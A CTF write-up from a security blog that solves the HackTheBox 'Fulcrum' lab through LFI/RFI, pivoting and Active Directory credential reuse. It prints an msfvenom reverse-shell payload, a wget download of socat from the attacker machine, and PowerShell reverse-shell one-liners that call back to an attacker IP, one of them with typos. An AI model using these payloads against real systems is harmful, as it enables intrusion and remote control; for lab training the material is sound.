<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">HacktheBox Fulcrum Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-fulcrum-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-09-17T16:47:27+00:00">September 17, 2018</time><time class="updated" datetime="2025-07-05T15:17:53+00:00">July 5, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends!! Today we are going to solve another CTF challenge “Fulcrum” which is available online for those who want to increase their skill in penetration testing and black box testing. Fulcrum is a retired vulnerable lab presented by <strong>Hack the Box</strong> for making online penetration practices according to your experience level; they have the collection of vulnerable labs as challenges from beginners to Expert level.</span></p>
<p><span style="color: #000000;"><strong>Level:</strong> Expert</span></p>
<p><span style="color: #000000;"><strong>Task:</strong> find <strong>user.txt</strong> and <strong>root.txt</strong> file on the victim’s machine.</span></p>
<p><span style="color: #000000;">Since these labs are online available therefore they have static IP and IP of Fulcrum is <strong>10.10.10.62</strong> so let’s begin with nmap port enumeration.</span></p>
<p><span style="color: #000000;">We need to do a nmap version scan so that we can get better information about the open ports.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sV -p- 10.10.10.62</pre>
<p><span style="color: #000000;">From the given below image, you can observe that we find ports 4, 22, 80, 88, 9999, 56423 are open.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-WhQvoDGkLtw/W5_XaMS6yOI/AAAAAAAAaR4/DFY_wmuMK_MP2aIZwjFi2Eb8XdCOlFS8gCEwYBhgL/s1600/1.png"/></span></p>
<p><span style="color: #000000;">As port 4 is running Nginx server, the Nginx server hosts the webpage to view it we will open it in our browser to find a page that says it is under maintenance along with a link that says try again.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-XLrC386evRE/W5_Xdv4OOsI/AAAAAAAAaSA/F2XVpDUfRrUkBhZLkdQ_SMYdOXNnJF9eACEwYBhgL/s1600/2.png"/></span></p>
<p><span style="color: #000000;">We will click on the link and find that there is a page parameter that we found to be vulnerable to LFI.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-GLu3m520O-Q/W5_Xi9bTAbI/AAAAAAAAaSA/Cbt0xQzeTkYcq_gz5oqLD76lp2eTcd3uQCEwYBhgL/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Back to the nmap scan we also saw that port 80 is running Nginx server, we open it in our browser and find a server error This was proved to be a dead end</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-X5tuPlDS3L8/W5_XjVkd2EI/AAAAAAAAaSM/mV0vJOVreE86YlkovARy1U7bKKflCBRqwCEwYBhgL/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Let’s try our lock on Port 88 which I also running nginx server, we open the IP address in our browser on port 88 and find a phpmyadmin page. As we don’t have any hint or clue for the credentials, we will have to try another port.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-TTxEiikeqVc/W5_Xjv9YBsI/AAAAAAAAaSA/WOeCQJuPQkcfRbn6Qhofz6Mf_jRTiycZACEwYBhgL/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Port 9999 is running nginx server, we open the IP address on port 9999 in our browser and find a pfsense login page.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-bcQPXpr5rT8/W5_Xj2xLewI/AAAAAAAAaSE/6KPevOsqSqwdISAbrWH1QZ0jPlYkdjx0wCEwYBhgL/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Port 56423 is running nginx, so visiting the service on Port 56423 brings us to what appears to be some sort of “API” endpoint as we receive a JSON response.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-ZIA0nOBncDA/W5_XjwfLIQI/AAAAAAAAaSA/Dd_N6VMlkxUMOwqkBq7Ls18KsF6japn2QCEwYBhgL/s1600/7.png"/></span></p>
<p><span style="color: #000000;">It is possible that this page is vulnerable to XXE, so we create a shell so that can upload and execute it on the target machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.6 lport=4444 -f raw &gt; shell.php</pre>
<p><span style="color: #000000;">After creating a shell, we start an HTTP server on our system using python.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -m SimpleHTTPServer 80</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-YZmoHirkkrc/W5_XkETuNaI/AAAAAAAAaSM/qsS6I4LFw801cITd05p-hgdCj16OXHX6ACEwYBhgL/s1600/8.png"/></span></p>
<p><span style="color: #000000;">After creating the shell, we set up our listener using Metasploit-framework.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf &gt; use exploit/multi/handler
msf exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp
msf exploit(multi/handler) &gt; set lhost 10.10.14.6
msf exploit(multi/handler) &gt; set lport 4444
msf exploit(multi/handler) &gt; run</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-oVZtP0nyDcc/W5_XkaU3v7I/AAAAAAAAaSI/QK4QSzD3bPQuNI_NQ7rd6p4u5IE05iiJQCEwYBhgL/s1600/9.png"/></span></p>
<p><span style="color: #000000;">Using BurpSuite, we will capture the request, and upload the php shell. But we are unable to get a reverse shell.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-79HXnPyUs6g/W5_XaNh6unI/AAAAAAAAaR4/uv5LrnmODDQT67rhvAyAuoAMcsYpfDxLwCEwYBhgL/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Su, we try to exploit the page we find on port 4 using RFI and were able to successfully get a reverse shell.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_p9eb51dS4c/W5_XaMk7uWI/AAAAAAAAaSA/exTd2ZKMacwwf6CMdjXo8zcLpUfcHXroQCEwYBhgL/s1600/11.png"/></span></p>
<p><span style="color: #000000;">We get the reverse shell, but it was not a proper shell. We will spawn a tty shell using python.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -c "import pty; pty.spawn('/bin/bash')"</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Xv4oLu85YEs/W5_XbIyIGoI/AAAAAAAAaR0/cCMQkBhaCdMY7wmkfUvOZnLN439_PIvtACEwYBhgL/s1600/12.png"/></span></p>
<p><span style="color: #000000;">After spawning a tty shell, we find a file called ‘Fulcrum_Upload_to_Corp.ps1’. We open and find it is a PowerShell script to encrypt the password it goes through some functions.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-EvZjCL-esBo/W5_Xa0g_L9I/AAAAAAAAaSM/SITV6RyxOawmRThzCPTZPGNC3frHVsNlwCEwYBhgL/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Now we copy the content of the script and paste it in a site called https://tio.run/powershell. We do this in hope to extract the logon credentials on the server.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-DdD34NV5jso/W5_XbNRU2qI/AAAAAAAAaR8/L8aHzWw_SYEN6LxXfiWTewQsfpq2HPa5gCEwYBhgL/s1600/14.png"/></span></p>
<p><span style="color: #000000;">Enumerating further into the system we find a file that contains an interesting internal IP address:192.168.122.228. Further what to do is that we will divert our attention to enumerate this IP address.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-ngxLnoTPeBA/W5_Xbrjv87I/AAAAAAAAaR4/6vdhnPEUQoswXgj-z4COm-bWXBhNDeMBACEwYBhgL/s1600/15.png"/></span></p>
<p><span style="color: #000000;">We scan the port of the IP address using netcat. After completion of the scan, we find that port 5986 is open.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -zv 192.168.122.228 1-65535</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-w-EAZhvqY7E/W5_XcGuNCvI/AAAAAAAAaSE/uJ2fw53j04AGNDUVHO3huNdpyx_02FmFwCEwYBhgL/s1600/16.png"/></span></p>
<p><span style="color: #000000;">We download socat into the target machine. Socat is a very useful tool which helps us to pivot our way into another network.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /tmp
wget http://10.10.14.6/socat
./socat tcp-listen:60217,reuseaddr,fork tcp:192.168.122.228:5986 &amp;</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-7U2zsTQcXAQ/W5_Xch7gA2I/AAAAAAAAaSI/hLMj7qAlG9soIy52IJlqrLSSDjWLEaXNgCEwYBhgL/s1600/18.png"/></span></p>
<p><span style="color: #000000;">We relay the connection to port 60217 on 10.10.10.62 using socat.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">socat tcp-listen:5986,reuseaddr,fork tcp:10.10.10.62:60217</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-QRP2yFmblfY/W5_XdPLripI/AAAAAAAAaSE/BqB9yj1FmQMBxsbpbnaGbMJoWEEk1wh9gCEwYBhgL/s1600/19.png"/></span></p>
<p><span style="color: #000000;">We will now use PowerShell on our windows machine to connect to the kali machine that will allow us to directly connect to the target machine. After connecting we take a look at the content of the default directory we are in and find a few files called “CheckFileServer.ps1”, “Invoke-PsExec.ps1” and “user.txt”.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Enter-PSSession -ComputerName 192.168.199.130 -Credential $5 -UseSSL -SessionOption (New-PSSessionOption -SkipCACheck -SkipCNCheck)
dir
type user.txt
type CheckFileServer.ps1</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-dc67rdhVchw/W5_XeIct2II/AAAAAAAAaR8/-I69rkHKk8Yh6Hbju-yXYIp60MudrYfXgCEwYBhgL/s1600/20.PNG"/></span></p>
<p><span style="color: #000000;">Enumerating through the directories inside default IIS directory. We open web.config file and find LDAP login credentials.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-dIaUcaryEio/W5_Xe8aCaAI/AAAAAAAAaR8/xmqJrHa2K-gJSGswEtl1r9vrhU65UA56wCEwYBhgL/s1600/21.PNG"/></span></p>
<p><span style="color: #000000;">Let’s create an LDAP query, and find two CNs: DC and File. We create a query about these CN’s and find some credentials.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">(New-Object adsisearcher((New-Object adsi("LDAP://dc.fulcrumlocal”, "fulcrum\ldap","PasswordForSearch123!")),(objectCategory=Computer)")).FindAll() | %{ $_.Properties.name }</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-YfCucyZbaiY/W5_XfZP5RwI/AAAAAAAAaSA/jxhGV2EOnLkAi5lFNjuS42w0WtKKcOauACEwYBhgL/s1600/22.PNG"/></span></p>
<p><span style="color: #000000;">Then, we create a script to get a the user.txt and were successfully able to get the first flag. We do not have permission to get multiple PS hop.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Invoke-Command -CommandName file.fulcrm.local -Credential fulcrum.local\btables -Port 5985 -ScriptBlock { type C:\User\Btables\Desktop\user.txt }

Invoke-Command -ComputerName file.fulcrum.local -Credentail fulcrum.local\btables -Port 5985 -ScriptBlock {$client = New-Object System.Net.Sockets.TCPClient('10.10.14.6',53);$stream =$client.GertStream(); [byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes.0 $bytes.Lenght)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2&gt;&amp;1 | Out-String); $sendback2 = $sendback + ‘PS ‘ + (pwd).Path + ‘&gt;’;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Lenght);$stream.Flush();$client.Close() }</pre>
<pre class="lang:default decode:true"><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-TYLXKt4X39E/W5_XfoGwo5I/AAAAAAAAaR4/fA22FbAjKy48OKP5uZa4-Lz_KC28z3SoQCEwYBhgL/s1600/23.PNG"/></span></pre>
<p><span style="color: #000000;">We set up our listener using netcat and get our reverse shell. Then, we check for the available files and find a file called user.txt. We open it and find the first flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-WFi5fqfk06s/W5_XgDmSRoI/AAAAAAAAaSA/eSPRudIA7Ho_tmjVMGSb5M0JQWVwnNIoACEwYBhgL/s1600/24.png"/></span></p>
<p><span style="color: #000000;">Now as we have a shell on the file server. We will use the credentials we found earlier to get access to the DC server.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">net use \\dc.fulcrum.local\netlogon /user:fulcrum\btables ++FileServerLogon12345++</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-ew0YQaOrchU/W5_XgrRzKfI/AAAAAAAAaSA/E_8K3OZUvuYUnodxGDdYtTvlCcJIh_yMACEwYBhgL/s1600/25.png"/></span></p>
<p><span style="color: #000000;">When we will connect to DC server we find multiple ps1 scripts that contain credentials which will further help us to get access on the server.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-cym9au1ixVQ/W5_XhOh5oBI/AAAAAAAAaSI/FwYjyZYgUWcMxhnXt5r0W3wCVn5Yp_8vwCEwYBhgL/s1600/26.png"/></span></p>
<p><span style="color: #000000;">We create a script to check all right credentials in the file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-aPx4mjmblFM/W5_Xh7O4FqI/AAAAAAAAaR4/WFugUwQdbxI0avR9mM-qfv6EIPAd1tdVACEwYBhgL/s1600/27.png"/></span></p>
<p><span style="color: #000000;">Now we create a script to get a shell on the domain controller server.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Invoke-Command -ComputerName dc.fulcrum.local -Credential 923a -Port 5985 -ScriptBlock { $client = New-Object System.Net.Sockets.TCPClient('10.10.14.6',53);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() }</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-3eRc58xPokQ/W5_XiWc1SmI/AAAAAAAAaSE/gY-NIvvvHSQHCbkhhVDXpNYZqJAMXAppwCEwYBhgL/s1600/28.png"/></span></p>
<p><span style="color: #000000;">When we run the script, we get a pop on the windows screen that asks for a password. We use the password we find earlier with the help of a script.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FiK6UxwE8vY/W5_XixGB4VI/AAAAAAAAaSI/MxUNiThpNeMtpEvvk0v4gPXYSpobqR26ACEwYBhgL/s1600/29.PNG"/></span></p>
<p><span style="color: #000000;">We set up the listener and wait for the reverse shell. After getting the reverse shell in c:\Users\Administrator\Desktop we find a file called root.txt. We take a look at the content of the file and find our 2<sup>nd</sup> flag.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 53</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-xty2ZJnu1zU/W5_XjFTMIBI/AAAAAAAAaR8/0Vr47vra3_IroEBXw4m557ISS3TsQE1LQCEwYBhgL/s1600/35.png"/></span></p>
<p><strong>Author</strong>: Sayantan Bera is a technical writer at hacking articles and cybersecurity enthusiast. Contact <a href="https://www.linkedin.com/in/sayantan-bera-2098a613b/"><strong>Here</strong></a></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
